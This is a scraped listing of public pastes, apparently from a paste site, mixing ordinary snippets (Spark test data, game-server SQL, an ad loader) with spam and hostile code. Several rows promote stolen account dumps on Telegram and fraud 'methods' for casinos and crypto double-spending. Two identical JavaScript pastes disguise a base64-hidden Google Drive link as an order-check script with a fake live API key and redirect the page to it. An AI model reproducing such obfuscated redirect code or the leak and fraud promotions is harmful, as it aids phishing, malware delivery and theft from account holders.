id,title,username,language,date,content
9apsQXcr,Stake Free Balance Method,jm33,JavaScript,Friday 2nd of May 2025 12:43:07 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 67410
3HQ6yxLk,PayPal with Balance,hubertzoo90,JavaScript,Friday 2nd of May 2025 12:43:05 PM CDT,21460 Accounts Posted On https://t.me/leakzbyeminem
dSGsWM2p,Make $1000 15-MINUTES (BEGINNER) L4,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:40:49 PM CDT," 
Pdf https://tinyurl.com/freshleaks

pErZvVzRAL
"
JEwYwmB2,Untitled,Locative,SQL,Friday 2nd of May 2025 12:37:40 PM CDT,"update `bonus` set `gold`=gold-11600  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -11600, '-11600 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+6500  where `id`='1092273'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1092273, NOW(), +6500, '+6500 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-3800  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -3800, '-3800 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+2200  where `id`='1668517'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1668517, NOW(), +2200, '+2200 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-1200  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -1200, '-1200 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+1200  where `id`='293530'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (293530, NOW(), +1200, '+1200 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-111  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -111, '-111 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+111  where `id`='1691193'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1691193, NOW(), +111, '+111 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-7700  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -7700, '-7700 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+6900  where `id`='1571177'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1571177, NOW(), +6900, '+6900 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-80  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -80, '-80 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+80  where `id`='639952'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (639952, NOW(), +80, '+80 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-4235  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -4235, '-4235 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+4235  where `id`='431190'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (431190, NOW(), +4235, '+4235 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-8373  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -8373, '-8373 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+4300  where `id`='676443'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (676443, NOW(), +4300, '+4300 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-2549  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -2549, '-2549 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+100  where `id`='921924'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (921924, NOW(), +100, '+100 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-3810  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -3810, '-3810 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+3070  where `id`='305161'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (305161, NOW(), +3070, '+3070 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-5640  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -5640, '-5640 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+4210  where `id`='1053554'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1053554, NOW(), +4210, '+4210 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-5793  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -5793, '-5793 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+770  where `id`='1304365'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1304365, NOW(), +770, '+770 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-8005  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -8005, '-8005 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+6070  where `id`='407331'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (407331, NOW(), +6070, '+6070 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-3375  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -3375, '-3375 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+3375  where `id`='1642717'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1642717, NOW(), +3375, '+3375 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-2680  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -2680, '-2680 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+2680  where `id`='1332159'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1332159, NOW(), +2680, '+2680 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-1157  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -1157, '-1157 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+1157  where `id`='1059756'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1059756, NOW(), +1157, '+1157 золотых бонусов, возврат краденных бонусов');

update `bonus` set `gold`=gold-17615  where `id`='1321540'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1321540, NOW(), -17615, '-17615 золотых бонусов, кража бонусов');

update `bonus` set `gold`=gold+9000  where `id`='1536695'; 
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1536695, NOW(), +9000, '+9000 золотых бонусов, возврат краденных бонусов');

UPDATE `characters` SET `account`='1536695' WHERE `guid`='173164'; -- x100
UPDATE `characters` SET `account`='1059756' WHERE `guid`='153386'; -- x100
UPDATE `characters` SET `account`='1332159' WHERE `guid`='174728'; -- x100
UPDATE `characters` SET `account`='1642717' WHERE `guid`='174621'; -- x100
UPDATE `characters` SET `account`='1642717' WHERE `guid`='174622'; -- x100
UPDATE `characters` SET `account`='407331' WHERE `guid`='169348'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145032'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145035'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145033'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145043'; -- x100
UPDATE `characters` SET `account`='1304365' WHERE `guid`='145037'; -- x100
UPDATE `characters` SET `account`='1053554' WHERE `guid`='173835'; -- x100
UPDATE `characters` SET `account`='305161' WHERE `guid`='4672'; -- x100
UPDATE `characters` SET `account`='921924' WHERE `guid`='150523'; -- x100
UPDATE `characters` SET `account`='921924' WHERE `guid`='151916'; -- x100
UPDATE `characters` SET `account`='676443' WHERE `guid`='172424'; -- x100

UPDATE `account` SET `token_key` = 'antiseller', `locked` = 5 WHERE username in ('shelbyz2108', 'shamov95', 'morgyll', 'pistran', 'sam33454', 'SteasyClothing', 'sapogov08', 'panin1999', 'Alina123085', 'stigmatov', 'sp2xone93rus', 'naxx2004', 'delux332208', 'natanzik', 'borkas91', 'Treyli', 'oneback', 'Gera_bo4ka', 'botinki123', 'flaco16', 'nbgjuhfabz');

UPDATE `account` SET `token_key` = 'antiseller', `locked` = 5, `last_ip` = '127.0.0.1' WHERE username in ('shelbyz2108', 'shamov95', 'morgyll', 'pistran', 'sam33454', 'SteasyClothing', 'sapogov08', 'panin1999', 'Alina123085', 'stigmatov', 'sp2xone93rus', 'naxx2004', 'delux332208', 'natanzik', 'borkas91', 'Treyli', 'oneback', 'Gera_bo4ka', 'botinki123', 'flaco16', 'nbgjuhfabz');
"
c3yjDhB8,EARN $900 INSTANTLY 2025⭐ GV,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:31:36 PM CDT," 
Pdf https://tinyurl.com/freshleaks

0euo4zF9Cn
"
7f0AM6tr,Untitled,zebmekey,JavaScript,Friday 2nd of May 2025 12:28:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86238/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MvGDn4Jn,Scam Casinos and Stores,jm33,JavaScript,Friday 2nd of May 2025 12:27:45 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 25760
HJfmQC9P,Leaked Accounts - Fresh Hits,hubertzoo90,JavaScript,Friday 2nd of May 2025 12:27:43 PM CDT,07695 Accounts Posted On https://t.me/leakzbyeminem
u7vc5fsC,testDAta,tills,Scala,Friday 2nd of May 2025 12:24:21 PM CDT,"/**
 * Generuje dane testowe dla tabeli lrx_panel i tworzy tabelę tymczasową
 */
def generatePanelData(spark: SparkSession): Unit = {
  import spark.implicits._
  
  // Dwa sklepy: jeden dobry, jeden zły
  val panelDF = Seq(1, 2).toDF(""shop_id"")
  
  // Tworzenie tabeli tymczasowej
  panelDF.createOrReplaceTempView(""lrx_panel"")
  
  println(""Tabela lrx_panel utworzona z 2 sklepami"")
}

/**
 * Generuje dane testowe dla tabeli dim_pack i tworzy tabelę tymczasową
 */
def generateDimPackData(spark: SparkSession): Unit = {
  import spark.implicits._
  
  // Dane z lekami RX i OTC - teraz używamy int dla pack_id
  val data = Seq(
    (1, ""RX"", 20210101, 20211231),
    (2, ""RX"", 20210101, 20211231),
    (3, ""OTC"", 20210101, 20211231)
  )
  
  val dimPackDF = data.toDF(""pack_id"", ""basket_4_code"", ""day_id_from"", ""day_id_to"")
  
  // Tworzenie tabeli tymczasowej
  dimPackDF.createOrReplaceTempView(""dim_pack"")
  
  println(""Tabela dim_pack utworzona z 3 produktami"")
}

/**
 * Generuje dane testowe sprzedaży i zwraca DataFrame
 */
def generateSalesData(spark: SparkSession): DataFrame = {
  import spark.implicits._
  
  // Dane dla dobrego sklepu (sklep_id=1)
  val goodShopData = Seq(
    // miesiąc 1 - 202101 - stałe wartości (20 pacjentów, głównie RX)
    (1, 202101, 1, 101, 1, 20210115, 1),
    (1, 202101, 2, 102, 1, 20210115, 1),
    (1, 202101, 3, 103, 1, 20210115, 1),
    (1, 202101, 4, 104, 1, 20210115, 2),
    (1, 202101, 5, 105, 1, 20210115, 2),
    (1, 202101, 6, 106, 2, 20210115, 2),
    (1, 202101, 7, 107, 2, 20210115, 3),
    (1, 202101, 8, 108, 2, 20210115, 3),
    (1, 202101, 9, 109, 2, 20210115, 3),
    (1, 202101, 10, 110, 2, 20210115, 1),
    (1, 202101, 11, 111, 3, 20210116, null),
    (1, 202101, 12, 112, 3, 20210116, null),
    (1, 202101, 13, 113, 3, 20210116, null),
    (1, 202101, 14, 114, 1, 20210116, 2),
    (1, 202101, 15, 115, 1, 20210116, 2),
    (1, 202101, 16, 116, 1, 20210116, 3),
    (1, 202101, 17, 117, 1, 20210116, 3),
    (1, 202101, 18, 118, 2, 20210116, 1),
    (1, 202101, 19, 119, 2, 20210116, 1),
    (1, 202101, 20, 120, 2, 20210116, 2),
    
    // miesiąc 2 - 202102 - podobne stałe wartości
    (1, 202102, 1, 201, 1, 20210215, 1),
    (1, 202102, 2, 202, 1, 20210215, 1),
    (1, 202102, 3, 203, 1, 20210215, 1),
    (1, 202102, 4, 204, 1, 20210215, 2),
    (1, 202102, 5, 205, 1, 20210215, 2),
    (1, 202102, 6, 206, 2, 20210215, 2),
    (1, 202102, 7, 207, 2, 20210215, 3),
    (1, 202102, 8, 208, 2, 20210215, 3),
    (1, 202102, 9, 209, 2, 20210215, 3),
    (1, 202102, 10, 210, 2, 20210215, 1),
    (1, 202102, 11, 211, 3, 20210216, null),
    (1, 202102, 12, 212, 3, 20210216, null),
    (1, 202102, 13, 213, 3, 20210216, null),
    (1, 202102, 14, 214, 1, 20210216, 2),
    (1, 202102, 15, 215, 1, 20210216, 2),
    (1, 202102, 16, 216, 1, 20210216, 3),
    (1, 202102, 17, 217, 1, 20210216, 3),
    (1, 202102, 18, 218, 2, 20210216, 1),
    (1, 202102, 19, 219, 2, 20210216, 1),
    (1, 202102, 20, 220, 2, 20210216, 2),
    
    // miesiąc 3 - 202103 - podobne stałe wartości
    (1, 202103, 1, 301, 1, 20210315, 1),
    (1, 202103, 2, 302, 1, 20210315, 1),
    (1, 202103, 3, 303, 1, 20210315, 1),
    (1, 202103, 4, 304, 1, 20210315, 2),
    (1, 202103, 5, 305, 1, 20210315, 2),
    (1, 202103, 6, 306, 2, 20210315, 2),
    (1, 202103, 7, 307, 2, 20210315, 3),
    (1, 202103, 8, 308, 2, 20210315, 3),
    (1, 202103, 9, 309, 2, 20210315, 3),
    (1, 202103, 10, 310, 2, 20210315, 1),
    (1, 202103, 11, 311, 3, 20210316, null),
    (1, 202103, 12, 312, 3, 20210316, null),
    (1, 202103, 13, 313, 3, 20210316, null),
    (1, 202103, 14, 314, 1, 20210316, 2),
    (1, 202103, 15, 315, 1, 20210316, 2),
    (1, 202103, 16, 316, 1, 20210316, 3),
    (1, 202103, 17, 317, 1, 20210316, 3),
    (1, 202103, 18, 318, 2, 20210316, 1),
    (1, 202103, 19, 319, 2, 20210316, 1),
    (1, 202103, 20, 320, 2, 20210316, 2),
    
    // miesiąc 4 - 202104 - podobne stałe wartości
    (1, 202104, 1, 401, 1, 20210415, 1),
    (1, 202104, 2, 402, 1, 20210415, 1),
    (1, 202104, 3, 403, 1, 20210415, 1),
    (1, 202104, 4, 404, 1, 20210415, 2),
    (1, 202104, 5, 405, 1, 20210415, 2),
    (1, 202104, 6, 406, 2, 20210415, 2),
    (1, 202104, 7, 407, 2, 20210415, 3),
    (1, 202104, 8, 408, 2, 20210415, 3),
    (1, 202104, 9, 409, 2, 20210415, 3),
    (1, 202104, 10, 410, 2, 20210415, 1),
    (1, 202104, 11, 411, 3, 20210416, null),
    (1, 202104, 12, 412, 3, 20210416, null),
    (1, 202104, 13, 413, 3, 20210416, null),
    (1, 202104, 14, 414, 1, 20210416, 2),
    (1, 202104, 15, 415, 1, 20210416, 2),
    (1, 202104, 16, 416, 1, 20210416, 3),
    (1, 202104, 17, 417, 1, 20210416, 3),
    (1, 202104, 18, 418, 2, 20210416, 1),
    (1, 202104, 19, 419, 2, 20210416, 1),
    (1, 202104, 20, 420, 2, 20210416, 2)
  )
  
  // Dane dla złego sklepu (sklep_id=2) - duże wahania i brak danych w ostatnim miesiącu
  val badShopData = Seq(
    // miesiąc 1 - 202101 - dużo RX (30 pacjentów)
    (2, 202101, 101, 1001, 1, 20210115, 1),
    (2, 202101, 102, 1002, 1, 20210115, 1),
    (2, 202101, 103, 1003, 1, 20210115, 1),
    (2, 202101, 104, 1004, 1, 20210115, 2),
    (2, 202101, 105, 1005, 1, 20210115, 2),
    (2, 202101, 106, 1006, 1, 20210115, 3),
    (2, 202101, 107, 1007, 1, 20210115, 1),
    (2, 202101, 108, 1008, 1, 20210115, 2),
    (2, 202101, 109, 1009, 1, 20210115, 3),
    (2, 202101, 110, 1010, 1, 20210115, 1),
    (2, 202101, 111, 1011, 1, 20210116, 2),
    (2, 202101, 112, 1012, 1, 20210116, 3),
    (2, 202101, 113, 1013, 1, 20210116, 1),
    (2, 202101, 114, 1014, 1, 20210116, 2),
    (2, 202101, 115, 1015, 1, 20210116, 3),
    (2, 202101, 116, 1016, 2, 20210116, 1),
    (2, 202101, 117, 1017, 2, 20210116, 2),
    (2, 202101, 118, 1018, 2, 20210116, 3),
    (2, 202101, 119, 1019, 2, 20210116, 1),
    (2, 202101, 120, 1020, 2, 20210116, 2),
    (2, 202101, 121, 1021, 3, 20210117, null),
    (2, 202101, 122, 1022, 3, 20210117, null),
    (2, 202101, 123, 1023, 3, 20210117, null),
    (2, 202101, 124, 1024, 3, 20210117, null),
    (2, 202101, 125, 1025, 3, 20210117, null),
    (2, 202101, 126, 1026, 2, 20210117, 3),
    (2, 202101, 127, 1027, 2, 20210117, 1),
    (2, 202101, 128, 1028, 2, 20210117, 2),
    (2, 202101, 129, 1029, 2, 20210117, 3),
    (2, 202101, 130, 1030, 2, 20210117, 1),
    
    // miesiąc 2 - 202102 - mało pacjentów (5) i brak RX
    (2, 202102, 101, 2001, 3, 20210215, null),
    (2, 202102, 102, 2002, 3, 20210215, null),
    (2, 202102, 103, 2003, 3, 20210215, null),
    (2, 202102, 104, 2004, 3, 20210215, null),
    (2, 202102, 105, 2005, 3, 20210215, null),
    
    // miesiąc 3 - 202103 - znowu dużo pacjentów (25) i dużo RX
    (2, 202103, 101, 3001, 1, 20210315, 1),
    (2, 202103, 102, 3002, 1, 20210315, 1),
    (2, 202103, 103, 3003, 1, 20210315, 1),
    (2, 202103, 104, 3004, 1, 20210315, 2),
    (2, 202103, 105, 3005, 1, 20210315, 2),
    (2, 202103, 106, 3006, 1, 20210315, 3),
    (2, 202103, 107, 3007, 1, 20210315, 1),
    (2, 202103, 108, 3008, 1, 20210315, 2),
    (2, 202103, 109, 3009, 1, 20210315, 3),
    (2, 202103, 110, 3010, 1, 20210315, 1),
    (2, 202103, 111, 3011, 1, 20210316, 2),
    (2, 202103, 112, 3012, 1, 20210316, 3),
    (2, 202103, 113, 3013, 1, 20210316, 1),
    (2, 202103, 114, 3014, 1, 20210316, 2),
    (2, 202103, 115, 3015, 1, 20210316, 3),
    (2, 202103, 116, 3016, 2, 20210316, 1),
    (2, 202103, 117, 3017, 2, 20210316, 2),
    (2, 202103, 118, 3018, 2, 20210316, 3),
    (2, 202103, 119, 3019, 2, 20210316, 1),
    (2, 202103, 120, 3020, 2, 20210316, 2),
    (2, 202103, 121, 3021, 3, 20210317, null),
    (2, 202103, 122, 3022, 3, 20210317, null),
    (2, 202103, 123, 3023, 3, 20210317, null),
    (2, 202103, 124, 3024, 3, 20210317, null),
    (2, 202103, 125, 3025, 3, 20210317, null)
    
    // miesiąc 4 - 202104 - brak danych celowo (naruszenie reguł)
  )
  
  // Łączymy dane i tworzymy DataFrame
  val allData = goodShopData ++ badShopData
  val salesDF = spark.createDataFrame(allData).toDF(
    ""shop_id"", ""month_id"", ""patient_id"", ""trn_id"", ""pack_id"", ""day_id"", ""prescriber_id""
  )
  
  println(s""Wygenerowano dane sprzedaży z ${salesDF.count()} rekordami"")
  
  salesDF
}"
9NQSR1bE,Make $1000 15-MINUTES  (BEGINNER) YR,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:22:20 PM CDT," 
Pdf https://tinyurl.com/freshleaks

7W4pyRtyP1
"
3DtAFri2,Products.js,zebmekey,JavaScript,Friday 2nd of May 2025 12:13:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14566/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8y7ZXwTk,EARN $900 INSTANTLY 2025 95,n1gg3r2126,JavaScript,Friday 2nd of May 2025 12:13:06 PM CDT," 
Pdf https://tinyurl.com/freshleaks

20OWUzZF5q
"
3WiyNx3n,Doublespending using Vanity Wallet,jm33,JavaScript,Friday 2nd of May 2025 12:12:19 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 25070
cjrf7K0q,Chaturbate with Tokens,hubertzoo90,JavaScript,Friday 2nd of May 2025 12:12:19 PM CDT,20909 Accounts Posted On https://t.me/leakzbyeminem
sxxvuMHQ,ad referer fix,petar_bonov,JavaScript,Friday 2nd of May 2025 12:06:49 PM CDT,"// BEFORE

const extractAdUnitId = (input) => {
    const match = input.match(/_A\.(\d+)\./);
    return match ? match[1] : """";
};
const divElement = document.createElement(""div"");
const objectElement = document.createElement(""object"");
objectElement.type = ""text/html"";
const baseUrl = ""https://img.gsmarena.com/banner.php3"";
const params = new URLSearchParams({
    adUnitID: `${extractAdUnitId(""/8095840/.2_A.35723.3_gsmarena.com_tier1"")}`,
    pageid: ""1"",
    country: ""RO"",
    lpe: """",
    keyw: """",
    visitqos: ""1"",
});
objectElement.data = `${baseUrl}?${params.toString()}`;
objectElement.width = ""728px"";
objectElement.height = ""94px"";
objectElement.style.overflow = ""auto"";
divElement.appendChild(objectElement);
document.body.appendChild(divElement);

// AFTER

const extractAdUnitId = (input) => {
    const match = input.match(/_A\.(\d+)\./);
    return match ? match[1] : """";
};
const divElement = document.createElement(""div"");
const baseUrl = ""https://img.gsmarena.com/banner.php3"";
const params = new URLSearchParams({
    adUnitID: `${extractAdUnitId(""/8095840/.2_A.35723.3_gsmarena.com_tier1"")}`,
    pageid: ""1"",
    country: ""RO"",
    lpe: """",
    keyw: """",
    visitqos: ""1"",
});
const url = `${baseUrl}?${params.toString()}`;
divElement.width = ""728px"";
divElement.height = ""94px"";
divElement.style.overflow = ""auto"";
document.body.appendChild(divElement);

const xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        const HTMLParser = new DOMParser();
        const parsedDocument = HTMLParser.parseFromString(this.responseText, ""text/html"");
        divElement.innerHTML = `${parsedDocument.head.innerHTML}${parsedDocument.body.innerHTML}`;
    }
};
xhr.open(""GET"", url, true);
xhr.send();"
zPs8Wf5L,Untitled,111fffgg,C++,Friday 2nd of May 2025 12:04:29 PM CDT,"กดเกดเกดเ
เกดดหด
เกดเกด
เกดเกดเกดเ
XPX3R-9FCX6-a9c1550f"
